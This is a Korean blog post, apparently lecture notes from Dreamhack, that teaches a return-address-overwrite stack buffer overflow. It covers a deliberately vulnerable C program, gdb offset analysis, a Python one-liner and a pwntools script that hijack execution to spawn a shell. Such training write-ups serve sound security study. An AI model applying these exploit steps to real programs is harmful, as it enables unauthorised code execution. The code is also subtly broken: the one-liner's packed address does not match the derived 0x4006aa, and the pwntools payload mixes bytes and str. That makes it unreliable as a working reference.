---
title: "[pwnable] Return To Overwrite"
date: 2022-02-08T00:00:00+00:00
author: 이정목
layout: post
permalink: /return-to-overwrite/
categories: pwnable
tags: [dreamhack, pwnable, return to overwrite]
---

**해당 포스팅은 드림핵의 강의를 정리한 글이다.** Return to Overwrite는 스택 버퍼 오버플로우를 이용해서 return 자리의 주소를 내가 원하는 주소로 바꾸는 것이다. 따라서 스택에서 어느 위치에 버퍼가 위치해 있고, 얼마만큼을 overwrite해야 하는지를 잘 따져 주어야 한다. 해당 이미지는 [드림핵](https://dreamhack.io/learn/58#7)에 있는 그림을 가져온 것이다. 내가 함수 호출 규약을 설명한 [글](https://mok0102.github.io/호출-규약/)을 보면 제대로 알 수 있다.  

![이미지](https://kr.object.ncloudstorage.com/dreamhack-content/page/ba14b1d45d74d46ab7f84d20ec60a4806f9d42bb29d2fb6f434cf152d9b0a76c.png) 

## 스택 구조
함수 스택이 새로 생성되면, 함수 파라미터들이  제일 주소가 큰 쪽(아래쪽)에 쌓이고, 그 다음에 돌아가기 위한 ret주소가 실리고, 그 위에 이전 스택 프레임의 시작 지점(sfp)가 실린다. 그 위에 이제 buf처럼 해당하는 변수들이 쌓이게 된다. 따라서 스택은 위로(주소가 큰 쪽에서 작은 쪽으로) 자란다. 그러나 우리가 buf에 값을 쓰는 건 위에서 아래로 써진다.(주소가 작은 쪽에서 큰 쪽으로) 결국 우리가 buf에서 값을 쓰기 시작하면 그 밑에 있는 sfp, ret에까지 침범할 수 있게 된다는 것이다. 이게 stack buffer overflow이고, 특별히 이 ret부분에 내가 실행하고자 하는 함수의 주소를 넣는 것이 return to overwrite이다. 

## 문제
우리는 다음 c 코드에서 쉘을 따는 익스플로잇을 Return to Overwrite를 통해 구현할 것이다. 아무런 보호 기법을 아직 적용하지 않고 문제를 풀 것이기 때문에 gcc 옵션으로 -fno-stack-protector와 -no-pie를 준다.
```c
// Name: rao.c
// Compile: gcc -o rao rao.c -fno-stack-protector -no-pie
#include <stdio.h>
#include <unistd.h>
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}
void get_shell() {
  char *cmd = "/bin/sh";
  char *args[] = {cmd, NULL};
  execve(cmd, args, NULL);
}
int main() {
  char buf[0x28];
  init();
  printf("Input: ");
  scanf("%s", buf);
  return 0;
}
```

## 문제 풀이
#### 1. 밀어야 할 크기 구하기
위 그림의 스택 구조에서, buf와 sfp를 모두 A와 같은 아무 문자열로 밀어 버리고 ret에 get_shell의 구조를 넣으면 쉘을 딸 수 있다. 따라서 가장 먼저 해야 하는 것은 buf와 sfp가 얼마나의 공간을 차지하고 있는가이다. 그걸 알아야 몇개의 A로 buf와 sfp를 깔끔하게 밀 수 있는지를 알 수 있을 테니까. 가장먼저, 64비트 체계이기 때문에 스택 한 칸의 크기는 0x8이다. 만약 32비트라면 0x4가 된다. 따라서 buf는 찾아봐야겠지만, sfp는 0x8만큼 차지하고 있다고 알 수 있다. 
이제, buf가 얼마나 공간을 차지하는지를 찾아볼 것이다. buf가 0x28만큼 공간을 차지하고 있다고 생각하고 buf 0x28, sfp 0x8해서 0x28+0x8만큼 민다고 생각할 수 있는데, 내가 느끼기로는 c코드만 보고서는 buf의 크기를 정확하게 알 수 없다. 0x28일 때도 있고, alignment라고 해서 8의 배수를 맞추기 위해? 조금 더 커질 때도 있다. 근데 내 경험상 8의 배수랑도 상관이 잘 없는 거 같고, 그냥 gdb로 buf의 크기가 얼마만큼 할당됬는지를 보는 게 제일 마음 편하다. 
![이미지](https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_gdb_main.png?raw=true){: width="500" height="500"}
밑의 그림을 보면, push rbp(이 Push된 자리에 sfp가 들어간다) 이후 sub rsp, 0x30을 하는데, 지금 rsp가 sfp자리를 가리키고 있는 상태에서 rsp가 위로 0x30만큼 올라갔으므로, buf의 크기가 0x30임을 알 수 있다. 
**결국 buf의 크기: 0x30, sfp의 크기: 0x8이므로 우리가 ret까지 가려면 총 0x38만큼을 아무 문자로 밀어주면 된다.**

#### 2. ret자리에 들어가야 할 것 구하기
지금 함수 중에 get_shell이라는 함수를 만들어 줬기 때문에, 굳이 막 라이브러리의 shell함수를 실행하지 않고 그냥 이 파일 자체의 get_shell함수의 주소를 ret자리에 넣어 주면 프로그램이 이게 return 주소인줄 착각하고 get_shell을 실행시킨다. 그럼 get_shell의 주소는 어떻게 구하면 될까? 모든 보호기법이 해제되어 있기 때문에, 프로그램을 실행할 때마다 get_shell의 주소가 바뀌는 복잡한 상황은 생기지 않는다. 따라서 get_shell의 주소를 다이나믹하게 구할 필요가 없고 그냥 상수처럼 한번 딱 찾아서 계속 그걸 쓰면 된다. 그럼 get_shell의 주소는 어떻게 찾을까? 여러가지 방법이 있다. 나는 gdb에 info func을 쳐서 나오는 모든 함수들의 주소 중에 get_shell을 찾아서 사용했는데, 단순히 그냥 print get_shell을 gdb에 입력하면 그 함수에 대한 정보를 주면서 주소도 같이 준다. 어떤 방법을 사용하던 상관 없다! 밑에서 구한 주소는 0x4006aa였다.

![이미지](https://github.com/JungMok-Lee/JungMok-Lee.github.io/blob/master/assets/images/2022_02_09_get_shell.png?raw=true)

#### 3. 익스플로잇 작성
###### 1) 커멘드
커멘드로 바로 보낼 수도 있는데, 여기서 주의해야 할 점은 실행파일이 64비트 little endian이므로 get_shell의 주소를 Little endian으로 바꿔서 보내야 한다는 것이다. 파이썬에 -c 옵션을 주어서 파이썬 실행 결과를 rao파일을 실행하면서 보낸다. 외워 두면 그래도 어느 정도 좋을 것 같다.
```python
(python -c "print 'A'*0x30 + 'A'*0x8 + '\xa7\x05\x40\x00\x00\x00\x00\x00'";cat)| ./rao
```

###### 2) pwntools
1번 방법을 나는 잘 몰라서 pwntools로 작성했다. rao 실행파일과 연결 후, input을 받기 전까지(Input: 이 터미널에 띄워 질때까지) 기다린다. 이후 페이로드로 0x38만큼 밀고, p64를 써서 get_shell의 주소를 little endian으로 보낸다. p64이므로 64비트로 패킹해준다. p32는 little endian으로 32비트로 패킹해준다. 이렇게 보내고 나면 익스플로잇이 완료되었으므로, 쉘과 인터렉티브하게 주고받기 위해 p.interactive()를 보낸다. 

```python
from pwn import *
p = process("./rao")

p.recvuntil("Input: ")

payload = b'A'*0x30 + 'A'*0x8
payload += p64(0x4006aa)

p.sendline(payload)

p.interactive()
```